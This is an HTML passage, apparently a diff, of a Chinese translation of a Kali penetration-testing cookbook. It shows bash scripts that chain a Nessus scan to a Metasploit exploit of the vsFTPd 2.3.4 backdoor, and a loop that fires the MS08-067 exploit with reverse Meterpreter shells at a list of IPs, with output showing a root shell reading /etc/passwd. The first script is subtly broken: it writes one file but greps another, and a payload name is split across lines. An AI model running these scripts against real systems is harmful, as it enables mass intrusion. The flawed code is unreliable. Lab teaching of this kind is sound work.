+</code></pre><p>&#x4E0A;&#x9762;&#x7684;&#x8F93;&#x51FA;&#x663E;&#x793A;&#xFF0C;&#x5728;&#x5B8C;&#x6210; Nmap NSE &#x811A;&#x672C;&#x540E;&#xFF0C;&#x5C06;&#x7ACB;&#x5373;&#x6267;&#x884C; Metasploit exploit &#x6A21;&#x5757;&#x5E76;&#x5728;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x4E0A;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x4EA4;&#x4E92;&#x5F0F; Meterpreter shell&#x3002;</p>
+<h3 id="&#x5DE5;&#x4F5C;&#x539F;&#x7406;">&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h3>
+<p>MSFCLI &#x662F; MSF &#x63A7;&#x5236;&#x53F0;&#x7684;&#x6709;&#x6548;&#x66FF;&#x4EE3;&#x5DE5;&#x5177;&#xFF0C;&#x53EF;&#x7528;&#x4E8E;&#x76F4;&#x63A5;&#x4ECE;&#x7EC8;&#x7AEF;&#x6267;&#x884C;&#x5355;&#x884C;&#x547D;&#x4EE4;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x5728;&#x4EA4;&#x4E92;&#x5F0F;&#x63A7;&#x5236;&#x53F0;&#x4E2D;&#x5DE5;&#x4F5C;&#x3002; &#x8FD9;&#x4F7F;&#x5F97; MSFCLI &#x5BF9;&#x4E8E; bash shell &#x811A;&#x672C;&#x4E2D;&#x7684;&#x4F7F;&#x7528;&#x662F;&#x4E00;&#x4E2A;&#x5F88;&#x597D;&#x7684;&#x529F;&#x80FD;&#x3002; &#x56E0;&#x4E3A;&#x53EF;&#x4EE5;&#x4ECE; bash &#x7EC8;&#x7AEF;&#x6267;&#x884C; NSE &#x811A;&#x672C;&#x548C; MSFCLI&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x8F7B;&#x677E;&#x7F16;&#x5199; shell &#x811A;&#x672C;&#x6765;&#x5C06;&#x8FD9;&#x4E24;&#x4E2A;&#x529F;&#x80FD;&#x7EC4;&#x5408;&#x5728;&#x4E00;&#x8D77;&#x3002;</p>
+<h2 id="84-&#x4F7F;&#x7528;-msf-&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x7684;-nessuscmd-&#x6F0F;&#x6D1E;&#x626B;&#x63CF;">8.4 &#x4F7F;&#x7528; MSF &#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x7684; Nessuscmd &#x6F0F;&#x6D1E;&#x626B;&#x63CF;</h2>
+<p>&#x5C06; NSE &#x811A;&#x672C;&#x548C; Metasploit &#x5229;&#x7528;&#x7ED3;&#x5408;&#x5230;&#x4E00;&#x8D77;&#x53EF;&#x4EE5;&#x51CF;&#x8F7B;&#x5DE5;&#x4F5C;&#x91CF;&#x3002;&#x53EF;&#x7531; NSE &#x811A;&#x672C;&#x6D4B;&#x8BD5;&#x7684;&#x6F0F;&#x6D1E;&#x6570;&#x91CF;&#x660E;&#x663E;&#x5C0F;&#x4E8E;&#x53EF;&#x901A;&#x8FC7;&#x4E13;&#x7528;&#x6F0F;&#x6D1E;&#x626B;&#x63CF;&#x7A0B;&#x5E8F;&#xFF08;&#x5982; Nessus&#xFF09;&#x8BC4;&#x4F30;&#x7684;&#x6F0F;&#x6D1E;&#x6570;&#x91CF;&#x3002; &#x5E78;&#x8FD0;&#x7684;&#x662F;&#xFF0C;Nessus &#x6709;&#x4E00;&#x4E2A;&#x540D;&#x4E3A; Nessuscmd &#x7684;&#x547D;&#x4EE4;&#x884C;&#x5DE5;&#x5177;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5728; bash &#x4E2D;&#x8F7B;&#x677E;&#x8BBF;&#x95EE;&#x3002; &#x8BE5;&#x79D8;&#x7C4D;&#x6F14;&#x793A;&#x4E86;&#x5982;&#x4F55;&#x5C06; Nessus &#x5B9A;&#x5411;&#x6F0F;&#x6D1E;&#x626B;&#x63CF;&#x4E0E; MSF &#x81EA;&#x52A8;&#x5229;&#x7528;&#x76F8;&#x7ED3;&#x5408;&#x6765;&#x9A8C;&#x8BC1;&#x53D1;&#x73B0;&#x3002;</p>
+<h3 id="&#x51C6;&#x5907;">&#x51C6;&#x5907;</h3>
+<p>&#x4E3A;&#x4E86;&#x4F7F;&#x7528;&#x6B64;&#x79D8;&#x7C4D;&#x4E2D;&#x6F14;&#x793A;&#x7684;&#x811A;&#x672C;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x8BBF;&#x95EE;&#x8FD0;&#x884C;&#x6F0F;&#x6D1E;&#x670D;&#x52A1;&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x8BE5;&#x670D;&#x52A1;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; Nessus &#x8FDB;&#x884C;&#x6807;&#x8BC6;&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; Metasploit &#x8FDB;&#x884C;&#x5229;&#x7528;&#x3002; &#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x5728; Metasploitable2 &#x670D;&#x52A1;&#x5668;&#x4E0A;&#x4F7F;&#x7528; vsFTPd 2.3.4 &#x540E;&#x95E8;&#x6F0F;&#x6D1E;&#x3002; &#x6709;&#x5173;&#x8BBE;&#x7F6E; Metasploitable2 &#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x5B89;&#x88C5; Metasploitable2&#x201D;&#x79D8;&#x7C4D;&#x3002;</p>
+<p>&#x6B64;&#x5916;&#xFF0C;&#x672C;&#x8282;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF08;&#x5982; VIM &#x6216; Nano&#xFF09;&#x5C06;&#x811A;&#x672C;&#x5199;&#x5165;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3002; &#x6709;&#x5173;&#x7F16;&#x5199;&#x811A;&#x672C;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF08;VIM &#x548C; Nano&#xFF09;&#x201D;&#x79D8;&#x7C4D;&#x3002;</p>
+<h3 id="&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;">&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;</h3>
+<p>&#x4E0B;&#x9762;&#x7684;&#x793A;&#x4F8B;&#x6F14;&#x793A;&#x4E86;&#x5982;&#x4F55;&#x4F7F;&#x7528; bash &#x811A;&#x672C;&#xFF0C;&#x5C06;&#x6F0F;&#x6D1E;&#x626B;&#x63CF;&#x548C;&#x76EE;&#x6807;&#x5229;&#x7528;&#x7684;&#x4EFB;&#x52A1;&#x7ED3;&#x5408;&#x5230;&#x4E00;&#x8D77;&#x3002; &#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;Nessuscmd &#x7528;&#x4E8E;&#x8FD0;&#x884C; Nessus &#x63D2;&#x4EF6;&#xFF0C;&#x6D4B;&#x8BD5; vsFTPd 2.3.4 &#x540E;&#x95E8;&#xFF0C;&#x4EE5;&#x786E;&#x5B9A;&#x7CFB;&#x7EDF;&#x662F;&#x5426;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#xFF0C;&#x7136;&#x540E;&#x5982;&#x679C;&#x53D1;&#x73B0;&#x7CFB;&#x7EDF;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#xFF0C;&#x5219;&#x5BF9;&#x7CFB;&#x7EDF;&#x6267;&#x884C;&#x76F8;&#x5E94;&#x7684; Metasploit &#x6F0F;&#x6D1E;&#x5229;&#x7528;&#xFF1A;</p>
+<pre><code class="lang-sh"><span class="hljs-meta">#! /bin/bash
+</span>
+<span class="hljs-keyword">if</span> [ ! <span class="hljs-variable">$1</span> ]; <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Usage: #./script &lt;RHOST&gt;&quot;</span>; <span class="hljs-built_in">exit</span>; <span class="hljs-keyword">fi</span>
+
+rhost=<span class="hljs-variable">$1</span>
+
+/opt/nessus/bin/nessuscmd -p 21 -i 55523 <span class="hljs-variable">$rhost</span> &gt;&gt; tmp_output.txt 
+<span class="hljs-keyword">if</span> [ $(grep 55523 output.txt | cut <span class="hljs-_">-d</span> <span class="hljs-string">&quot; &quot;</span> <span class="hljs-_">-f</span> 9) = <span class="hljs-string">&quot;55523&quot;</span> ];    
+    <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$rhost</span> appears to be vulnerable, exploiting with Metasploit...&quot;</span>;   
+    msfcli exploit/unix/ftp/vsftpd_234_backdoor PAYLOAD=cmd/unix/ 
+    interact RHOST=<span class="hljs-variable">$rhost</span> E; 
+<span class="hljs-keyword">fi</span> 
+rm tmp_output.txt
+</code></pre>
+<p>&#x811A;&#x672C;&#x7684;&#x5F00;&#x5934;&#x975E;&#x5E38;&#x7C7B;&#x4F3C;&#x4E8E;&#x6F0F;&#x6D1E;&#x626B;&#x63CF;&#x548C;&#x5229;&#x7528;&#x811A;&#x672C;&#xFF0C;&#x5B83;&#x5C06; NSE &#x626B;&#x63CF;&#x4E0E;&#x524D;&#x4E00;&#x4E2A;&#x79D8;&#x7C4D;&#x4E2D;&#x7684; MSF &#x5229;&#x7528;&#x7EC4;&#x5408;&#x5728;&#x4E00;&#x8D77;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x7531;&#x4E8E;&#x5728;&#x6B64;&#x7279;&#x5B9A;&#x811A;&#x672C;&#x4E2D;&#x4F7F;&#x7528;&#x4E86;&#x4E0D;&#x540C;&#x7684;&#x8F7D;&#x8377;&#xFF0C;&#x56E0;&#x6B64;&#x7528;&#x6237;&#x5FC5;&#x987B;&#x63D0;&#x4F9B;&#x7684;&#x552F;&#x4E00;&#x53C2;&#x6570;&#x662F;<code>RHOST</code>&#x503C;&#xFF0C;&#x8BE5;&#x503C;&#x5E94;&#x8BE5;&#x662F;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x7684; IP &#x5730;&#x5740;&#x3002;&#x811A;&#x672C;&#x7684;&#x6B63;&#x6587;&#x4EE5;&#x6267;&#x884C; Nessuscmd &#x5DE5;&#x5177;&#x5F00;&#x59CB;&#x3002; <code>-p</code>&#x53C2;&#x6570;&#x58F0;&#x660E;&#x6B63;&#x5728;&#x8BC4;&#x4F30;&#x7684;&#x8FDC;&#x7A0B;&#x7AEF;&#x53E3;&#xFF0C;<code>-i</code>&#x53C2;&#x6570;&#x58F0;&#x660E;&#x63D2;&#x4EF6;&#x53F7;&#x3002;&#x63D2;&#x4EF6; 55523 &#x5BF9;&#x5E94; VSFTPd 2.3.4 &#x540E;&#x95E8;&#x7684; Nessus &#x5BA1;&#x8BA1;&#x3002; &#x7136;&#x540E;&#xFF0C;Nessuscmd &#x7684;&#x8F93;&#x51FA;&#x91CD;&#x5B9A;&#x5411;&#x5230;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;<code>tmp_output.txt</code>&#x7684;&#x4E34;&#x65F6;&#x8F93;&#x51FA;&#x6587;&#x4EF6;&#x3002;&#x5982;&#x679C;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x4E0A;&#x5B58;&#x5728;&#x6B64;&#x6F0F;&#x6D1E;&#xFF0C;&#x5219;&#x6B64;&#x811A;&#x672C;&#x7684;&#x8F93;&#x51FA;&#x5C06;&#x4EC5;&#x8FD4;&#x56DE;&#x63D2;&#x4EF6; ID&#x3002;&#x6240;&#x4EE5;&#x4E0B;&#x4E00;&#x884C;&#x4F7F;&#x7528;<code>if ... then</code>&#x6761;&#x4EF6;&#x8BED;&#x53E5;&#x7ED3;&#x5408;<code>grep</code>&#x5E8F;&#x5217;&#xFF0C;&#x6765;&#x786E;&#x5B9A;&#x8FD4;&#x56DE;&#x7684;&#x8F93;&#x51FA;&#x4E2D;&#x7684;&#x63D2;&#x4EF6; ID&#x3002;&#x5982;&#x679C;&#x8F93;&#x51FA;&#x4E2D;&#x8FD4;&#x56DE;&#x4E86;&#x63D2;&#x4EF6;ID&#xFF0C;&#x8868;&#x660E;&#x7CFB;&#x7EDF;&#x5E94;&#x8BE5;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#xFF0C;&#x90A3;&#x4E48;&#x5C06;&#x6267;&#x884C;&#x76F8;&#x5E94;&#x7684; Metasploit &#x5229;&#x7528;&#x6A21;&#x5757;&#x3002;</p>
+<pre><code>root@KaliLinux:~# ./nessuscmd_xploit.sh 
+Usage: #./script &lt;RHOST&gt;
+</code></pre><p>&#x5982;&#x679C;&#x5728;&#x4E0D;&#x63D0;&#x4F9B;&#x4EFB;&#x4F55;&#x53C2;&#x6570;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x6267;&#x884C;&#x811A;&#x672C;&#xFF0C;&#x811A;&#x672C;&#x5C06;&#x8F93;&#x51FA;&#x76F8;&#x5E94;&#x7684;&#x7528;&#x6CD5;&#x3002; &#x6B64;&#x4F7F;&#x7528;&#x63CF;&#x8FF0;&#x8868;&#x793A;&#xFF0C;&#x5E94;&#x4F7F;&#x7528;<code>RHOST</code>&#x53C2;&#x6570;&#x6267;&#x884C;&#x811A;&#x672C;&#xFF0C;&#x5B83;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x76EE;&#x6807; IP &#x5730;&#x5740;&#x3002; &#x6B64;&#x8F93;&#x5165;&#x503C;&#x5C06;&#x7528;&#x4E8E; Nessuscmd &#x6F0F;&#x6D1E;&#x626B;&#x63CF;&#x548C;&#xFF08;&#x5982;&#x679C;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#xFF09;&#x4F7F;&#x7528; Metasploit &#x5728;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x4E0A;&#x6267;&#x884C;&#x5229;&#x7528;&#x3002; &#x5728;&#x4EE5;&#x4E0B;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;&#x811A;&#x672C;&#x7528;&#x4E8E;&#x786E;&#x5B9A; IP &#x5730;&#x5740;&#x4E3A;<code>172.16.36.135</code>&#x7684;&#x4E3B;&#x673A;&#x662F;&#x5426;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#x3002; &#x5982;&#x679C;&#x7CFB;&#x7EDF;&#x88AB;&#x786E;&#x5B9A;&#x4E3A;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#xFF0C;&#x5219;&#x5C06;&#x6267;&#x884C;&#x8BE5;&#x5229;&#x7528;&#xFF0C;&#x5E76;&#x81EA;&#x52A8;&#x5EFA;&#x7ACB;&#x4E0E;&#x540E;&#x95E8;&#x7684;&#x8FDE;&#x63A5;&#x3002;</p>
+<pre><code>root@KaliLinux:~# ./nessuscmd_xploit.sh 172.16.36.135 
+172.16.36.135 appears to be vulnerable, exploiting with Metasploit... 
+[*] Initializing modules... 
+PAYLOAD =&gt; cmd/unix/interact 
+RHOST =&gt; 172.16.36.135 
+[*] Banner: 220 (vsFTPd 2.3.4) 
+[*] USER: 331 Please specify the password. 
+[+] Backdoor service has been spawned, handling... 
+[+] UID: uid=0(root) gid=0(root) 
+[*] Found shell. 
+[*] Command shell session 1 opened (172.16.36.232:48126 -&gt; 172.16.36.135:6200) at 2014-04-28 00:29:21 -0400
+
+whoami 
+root 
+cat /etc/passwd 
+root:x:0:0:root:/root:/bin/bash 
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh 
+bin:x:2:2:bin:/bin:/bin/sh 
+sys:x:3:3:sys:/dev:/bin/sh 
+sync:x:4:65534:sync:/bin:/bin/sync 
+                            **{TRUNCATED}**
+</code></pre><p>&#x56E0;&#x4E3A; Nessuscmd &#x7684;&#x8F93;&#x51FA;&#x88AB;&#x91CD;&#x5B9A;&#x5411;&#x5230;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x4F7F;&#x7528;&#x96C6;&#x6210;&#x7684;&#x8F93;&#x51FA;&#x51FD;&#x6570;&#xFF0C;&#x6240;&#x4EE5;&#x6CA1;&#x6709;&#x811A;&#x672C;&#x8FD4;&#x56DE;&#x7684;&#x8F93;&#x51FA;&#x6765;&#x8868;&#x660E;&#x626B;&#x63CF;&#x6210;&#x529F;&#xFF0C;&#x9664;&#x4E86;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x7528;&#x4E8E;&#x6307;&#x793A;&#x7CFB;&#x7EDF;&#x770B;&#x8D77;&#x6765;&#x5B58;&#x5728; Metasploit &#x8BD5;&#x56FE;&#x5229;&#x7528;&#x7684;&#x6F0F;&#x6D1E;&#x3002; &#x4E00;&#x65E6;&#x811A;&#x672C;&#x6267;&#x884C;&#x5B8C;&#x6BD5;&#xFF0C;&#x5C06;&#x5728;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x4E0A;&#x8FD4;&#x56DE;&#x5177;&#x6709;<code>root</code>&#x6743;&#x9650;&#x7684;&#x4EA4;&#x4E92;&#x5F0F; shell&#x3002; &#x4E3A;&#x4E86;&#x6F14;&#x793A;&#x8FD9;&#x4E00;&#x70B9;&#xFF0C;&#x6211;&#x4EEC;&#x4F7F;&#x7528;&#x4E86;<code>whoami</code>&#x548C;<code>cat</code>&#x547D;&#x4EE4;&#x3002;</p>
+<h3 id="&#x5DE5;&#x4F5C;&#x539F;&#x7406;">&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h3>
+<p>Nessuscmd &#x662F; Nessus &#x6F0F;&#x6D1E;&#x626B;&#x63CF;&#x5668;&#x4E2D;&#x5305;&#x542B;&#x7684;&#x547D;&#x4EE4;&#x884C;&#x5DE5;&#x5177;&#x3002; &#x6B64;&#x5DE5;&#x5177;&#x53EF;&#x7528;&#x4E8E;&#x901A;&#x8FC7;&#x76F4;&#x63A5;&#x4ECE;&#x7EC8;&#x7AEF;&#x6267;&#x884C;&#x76EE;&#x6807;&#x626B;&#x63CF;&#xFF0C;&#x6765;&#x626B;&#x63CF;&#x548C;&#x8BC4;&#x4F30;&#x4E0D;&#x540C;&#x63D2;&#x4EF6;&#x7684;&#x7ED3;&#x679C;&#x3002; &#x56E0;&#x4E3A;&#x8BE5;&#x5DE5;&#x5177;&#xFF08;&#x5982; MSFCLI&#xFF09;&#x53EF;&#x4EE5;&#x8F7B;&#x6613;&#x4ECE; bash &#x7EC8;&#x7AEF;&#x8C03;&#x7528;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5F88;&#x5BB9;&#x6613;&#x6784;&#x5EFA;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#xFF0C;&#x5C06;&#x4E24;&#x4E2A;&#x4EFB;&#x52A1;&#x4E32;&#x8054;&#x5230;&#x4E00;&#x8D77;&#xFF0C;&#x5C06;&#x6F0F;&#x6D1E;&#x626B;&#x63CF;&#x4E0E;&#x5229;&#x7528;&#x76F8;&#x7ED3;&#x5408;&#x3002;</p>
+<h2 id="85-&#x4F7F;&#x7528;&#x53CD;&#x5411;-shell-&#x8F7D;&#x8377;&#x7684;&#x591A;&#x7EBF;&#x7A0B;-msf-&#x6F0F;&#x6D1E;&#x5229;&#x7528;">8.5 &#x4F7F;&#x7528;&#x53CD;&#x5411; Shell &#x8F7D;&#x8377;&#x7684;&#x591A;&#x7EBF;&#x7A0B; MSF &#x6F0F;&#x6D1E;&#x5229;&#x7528;</h2>
+<p>&#x4F7F;&#x7528; Metasploit &#x6846;&#x67B6;&#x6267;&#x884C;&#x5927;&#x578B;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;&#x7684;&#x4E00;&#x4E2A;&#x56F0;&#x96BE;&#xFF0C;&#x662F;&#x6BCF;&#x4E2A;&#x5229;&#x7528;&#x5FC5;&#x987B;&#x6309;&#x987A;&#x5E8F;&#x5355;&#x72EC;&#x6267;&#x884C;&#x3002; &#x5982;&#x679C;&#x4F60;&#x60F3;&#x786E;&#x8BA4;&#x5927;&#x91CF;&#x7CFB;&#x7EDF;&#x4E2D;&#x5355;&#x4E2A;&#x6F0F;&#x6D1E;&#x7684;&#x53EF;&#x5229;&#x7528;&#x6027;&#xFF0C;&#x5355;&#x72EC;&#x5229;&#x7528;&#x6BCF;&#x4E2A;&#x6F0F;&#x6D1E;&#x7684;&#x4EFB;&#x52A1;&#x53EF;&#x80FD;&#x53D8;&#x5F97;&#x4E4F;&#x5473;&#x3002; &#x5E78;&#x8FD0;&#x7684;&#x662F;&#xFF0C;&#x901A;&#x8FC7;&#x7ED3;&#x5408; MSFCLI &#x548C; bash &#x811A;&#x672C;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6267;&#x884C;&#x5355;&#x4E2A;&#x811A;&#x672C;&#xFF0C;&#x8F7B;&#x6613;&#x5728;&#x591A;&#x4E2A;&#x7CFB;&#x7EDF;&#x4E0A;&#x540C;&#x65F6;&#x6267;&#x884C;&#x653B;&#x51FB;&#x3002; &#x8BE5;&#x79D8;&#x7C4D;&#x6F14;&#x793A;&#x4E86;&#x5982;&#x4F55;&#x4F7F;&#x7528; bash &#x5728;&#x591A;&#x4E2A;&#x7CFB;&#x7EDF;&#x4E2D;&#x5229;&#x7528;&#x5355;&#x4E2A;&#x6F0F;&#x6D1E;&#xFF0C;&#x5E76;&#x4E3A;&#x6BCF;&#x4E2A;&#x7CFB;&#x7EDF;&#x6253;&#x5F00;&#x4E00;&#x4E2A; Meterpreter shell&#x3002;</p>
+<h3 id="&#x51C6;&#x5907;">&#x51C6;&#x5907;</h3>
+<p>&#x8981;&#x4F7F;&#x7528;&#x6B64;&#x79D8;&#x7C4D;&#x4E2D;&#x6F14;&#x793A;&#x7684;&#x811A;&#x672C;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x8BBF;&#x95EE;&#x591A;&#x4E2A;&#x7CFB;&#x7EDF;&#xFF0C;&#x6BCF;&#x4E2A;&#x7CFB;&#x7EDF;&#x90FD;&#x5177;&#x6709;&#x53EF;&#x4F7F;&#x7528; Metasploit &#x5229;&#x7528;&#x7684;&#x76F8;&#x540C;&#x6F0F;&#x6D1E;&#x3002; &#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x590D;&#x5236;&#x4E86;&#x8FD0;&#x884C; Windows XP &#x6F0F;&#x6D1E;&#x7248;&#x672C;&#x7684; VM&#xFF0C;&#x6765;&#x751F;&#x6210; MS08-067 &#x6F0F;&#x6D1E;&#x7684;&#x4E09;&#x4E2A;&#x5B9E;&#x4F8B;&#x3002; &#x6709;&#x5173;&#x8BBE;&#x7F6E; Windows &#x7CFB;&#x7EDF;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x5B89;&#x88C5; Windows Server&#x201D;&#x79D8;&#x7C4D;&#x3002; &#x6B64;&#x5916;&#xFF0C;&#x672C;&#x8282;&#x8FD8;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF08;&#x5982; VIM &#x6216; Nano&#xFF09;&#x5C06;&#x811A;&#x672C;&#x5199;&#x5165;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3002; &#x6709;&#x5173;&#x7F16;&#x5199;&#x811A;&#x672C;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x7684;&#x201C;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF08;VIM &#x548C; Nano&#xFF09;&#x201D;&#x79D8;&#x7C4D;&#x3002;</p>
+<h3 id="&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;">&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;</h3>
+<p>&#x4E0B;&#x9762;&#x7684;&#x793A;&#x4F8B;&#x6F14;&#x793A;&#x4E86;&#x5982;&#x4F55;&#x4F7F;&#x7528; bash &#x811A;&#x672C;&#x540C;&#x65F6;&#x5229;&#x7528;&#x5355;&#x4E2A;&#x6F0F;&#x6D1E;&#x7684;&#x591A;&#x4E2A;&#x5B9E;&#x4F8B;&#x3002; &#x7279;&#x522B;&#x662F;&#xFF0C;&#x6B64;&#x811A;&#x672C;&#x53EF;&#x7528;&#x4E8E;&#x901A;&#x8FC7;&#x5F15;&#x7528; IP &#x5730;&#x5740;&#x7684;&#x8F93;&#x5165;&#x5217;&#x8868;&#x6765;&#x5229;&#x7528; MS08-067 NetAPI &#x6F0F;&#x6D1E;&#x7684;&#x591A;&#x4E2A;&#x5B9E;&#x4F8B;&#xFF1A;</p>
+<pre><code class="lang-sh"><span class="hljs-meta">#!/bin/bash</span>
+<span class="hljs-keyword">if</span> [ ! <span class="hljs-variable">$1</span> ]; <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Usage: #./script &lt;host file&gt; &lt;LHOST&gt;&quot;</span>; 
+<span class="hljs-built_in">exit</span>; <span class="hljs-keyword">fi</span>
+
+iplist=<span class="hljs-variable">$1</span> 
+lhost=<span class="hljs-variable">$2</span>
+
+i=4444 
+<span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> $(cat <span class="hljs-variable">$iplist</span>) 
+<span class="hljs-keyword">do</span>   
+    gnome-terminal -x msfcli exploit/windows/smb/ms08_067_netapi 
+    PAYLOAD=windows/meterpreter/reverse_tcp 
+    RHOST=<span class="hljs-variable">$ip</span> LHOST=<span class="hljs-variable">$lhost</span> LPORT=<span class="hljs-variable">$i</span> E   
+    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Exploiting <span class="hljs-variable">$ip</span> and establishing reverse connection on local port <span class="hljs-variable">$i</span>&quot;</span> 
+i=$((<span class="hljs-variable">$i</span>+1)) 
+<span class="hljs-keyword">done</span>
+</code></pre>
+<p>&#x811A;&#x672C;&#x4F7F;&#x7528;<code>for</code>&#x5FAA;&#x73AF;&#xFF0C;&#x5BF9;&#x8F93;&#x5165;&#x6587;&#x672C;&#x6587;&#x4EF6;&#x4E2D;&#x5217;&#x51FA;&#x7684;&#x6BCF;&#x4E2A; IP &#x5730;&#x5740;&#x6267;&#x884C;&#x7279;&#x5B9A;&#x4EFB;&#x52A1;&#x3002; &#x8BE5;&#x7279;&#x5B9A;&#x4EFB;&#x52A1;&#x5305;&#x62EC;&#x542F;&#x52A8;&#x4E00;&#x4E2A;&#x65B0;&#x7684; GNOME &#x7EC8;&#x7AEF;&#xFF0C;&#x8BE5;&#x7EC8;&#x7AEF;&#x53C8;&#x6267;&#x884C;&#x5FC5;&#x8981;&#x7684;<code>msfcli</code>&#x547D;&#x4EE4;&#x6765;&#x5229;&#x7528;&#x8BE5;&#x7279;&#x5B9A;&#x7CFB;&#x7EDF;&#xFF0C;&#x7136;&#x540E;&#x542F;&#x52A8;&#x53CD;&#x5411; TCP meterpreter shell&#x3002; &#x56E0;&#x4E3A;<code>for</code>&#x5FAA;&#x73AF;&#x4E3A;&#x6BCF;&#x4E2A; MSFCLI &#x6F0F;&#x6D1E;&#x542F;&#x52A8;&#x4E00;&#x4E2A;&#x65B0;&#x7684; GNOME &#x7EC8;&#x7AEF;&#xFF0C;&#x6BCF;&#x4E2A;&#x90FD;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x72EC;&#x7ACB;&#x7684;&#x8FDB;&#x7A0B;&#x6267;&#x884C;&#x3002; &#x4EE5;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#xFF0C;&#x591A;&#x4E2A;&#x8FDB;&#x7A0B;&#x53EF;&#x4EE5;&#x5E76;&#x884C;&#x8FD0;&#x884C;&#xFF0C;&#x5E76;&#x4E14;&#x6BCF;&#x4E2A;&#x76EE;&#x6807;&#x5C06;&#x88AB;&#x540C;&#x65F6;&#x5229;&#x7528;&#x3002; &#x672C;&#x5730;&#x7AEF;&#x53E3;&#x503C;&#x88AB;&#x521D;&#x59CB;&#x5316;&#x4E3A; 4444&#xFF0C;&#x5E76;&#x4E14;&#x5BF9;&#x88AB;&#x5229;&#x7528;&#x7684;&#x6BCF;&#x4E2A;&#x9644;&#x52A0;&#x7CFB;&#x7EDF;&#x589E;&#x52A0; 1&#xFF0C;&#x4F7F;&#x6BCF;&#x4E2A; meterpreter shell &#x8FDE;&#x63A5;&#x5230;&#x4E0D;&#x540C;&#x7684;&#x672C;&#x5730;&#x7AEF;&#x53E3;&#x3002; &#x56E0;&#x4E3A;&#x6BCF;&#x4E2A;&#x8FDB;&#x7A0B;&#x5728;&#x72EC;&#x7ACB;&#x7684; shell &#x4E2D;&#x6267;&#x884C;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x9700;&#x8981;&#x4ECE;&#x56FE;&#x5F62;&#x684C;&#x9762;&#x754C;&#x9762;&#x6267;&#x884C;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x901A;&#x8FC7; SSH &#x8FDE;&#x63A5;&#x6267;&#x884C;&#x3002; <code>./multipwn.sh bash 